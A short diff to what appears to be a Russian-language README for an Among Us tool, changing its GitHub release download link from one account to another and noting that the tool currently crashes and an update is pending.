@@ -4,7 +4,7 @@
 
 
 
-Скачать - https://github.com/defoxxx/among-us/releases/download/amongus/Release.zip
+Скачать - https://github.com/spacecollapse/among-us/releases/download/amongus/Release.zip
 
 он сейчас крашит ждите апдейт
 
